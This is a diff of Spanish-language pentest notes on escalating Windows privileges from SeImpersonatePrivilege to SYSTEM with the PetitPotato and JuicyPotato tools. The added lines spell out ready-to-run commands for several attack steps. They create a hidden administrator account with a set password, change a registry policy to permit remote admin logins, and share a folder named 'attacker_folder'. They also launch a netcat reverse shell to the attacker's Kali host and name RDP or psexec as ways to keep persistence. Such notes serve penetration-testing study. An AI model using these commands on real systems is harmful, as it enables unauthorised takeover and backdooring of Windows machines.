@@ -114,35 +114,53 @@ Notas:
 ```
 
 ```powershell
-2. 'SetImpersonatePrivilege' = Abusando de 'SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege'. Si un usuario tiene los privilegios antes mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM
+2. 'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM
 
-
-Pasos 'PetitPotato':
-❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0   # Descargar el archivo y transferirlo a la máquina Windows comprometida 
-❯ PetitPotato.exe 3 cmd         # Ejecutar en Windows y crear una cmd con el usuario 'NT Authority\System' 
+PASOS con 'PetitPotato' para crear un usuario y tener persistencia:
+# Descargar el archivo y transferirlo a la máquina Windows comprometida 
+❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0
+❯ .\PetitPotato.exe 3 cmd     # Ejecutar en Windows y crear una cmd con el usuario 'NT Authority\System' 
 	# EfsID = '3' es el numero de API a usar
-❯ PetitPotato.exe 3 "whoami"    # Ejecutar un comando  
-❯ PetitPotato.exe 3 "net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
-❯ PetitPotato.exe 3 "net localgroup Administrators omar /add"   # Agregar el usuario al grupo 'Administrators'
-❯ PetitPotato.exe 3 "net user Omar"                             # Mirar el grupo de un usuario en especifico
+❯ .\PetitPotato.exe 3 "whoami"    # Ejecutar un comando  
+❯ .\PetitPotato.exe 3 "net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
+❯ .\PetitPotato.exe 3 "net localgroup Administrators omar /add"   # Agregar el usuario al grupo 'Administrators'
+❯ .\PetitPotato.exe 3 "net user Omar"                             # Mirar el grupo de un usuario en especifico
 
 
-Pasos 'JuicyPotato':
-❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1    # Descargar el archivo y transferirlo a la máquina Windows comprometida 
-❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c net user omar P4ssw0rd /add" -l 1337
+Notas:
+	- Despues de crear un usuario para tener persistencia, se puede ingresar con 'RDP' si esta abierto el puerto '3389' o con 'psexec' SMB por el puerto '445' 
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+2. 'SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege' = Si un usuario tiene al menos un de los anteriores privilegios mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM
+
+PASOS con 'JuicyPotato' para crear un usuario y tener persistencia:
+# Descargar el archivo y transferirlo a la máquina Windows comprometida 
+❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user omar P4ssw0rd /add" -l 1337
 # Ejecutar en Windows para crear un usuario
 	# t = Crear un proceso 
 	# p = Programa a ejecutar 
 	# a = Argumento
 	# l = Puerto de escucha COM 
-❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c net localgroup Administrators omar /add" -l 1337
-❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
+❯ JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators omar /add" -l 1337
+❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
 # Opcional en caso de que no deje ingresar y necesite el recurso compartido
-❯ JuicyPotato.exe -t * -p C:\Window\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337  
+❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337  
+
 
 Notas:
-	1. Despues de crear un usuario para tener persistencia, podemos ingresar a con 'RDP' si esta abierto el puerto '3389' o con 'psexec' SMB por el puerto '445' 
-	2. También se pude utilizar 'RottenPotato'
+	- Despues de crear un usuario para tener persistencia, se puede ingresar con 'RDP' si esta abierto el puerto '3389' o con 'psexec' SMB por el puerto '445' 
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+2. 'SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege' = Si un usuario tiene al menos un de los anteriores privilegios mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM
+
+PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
+# Descargar JuicyPotato, Netcat y transferirlos a la máquina Windows
+❯ https://github.com/ohpe/juicy-potato/releases/tag/v0.1    
+❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd IP_Kali 443"
 ```
 
 ## Grupos Windows para escalar 
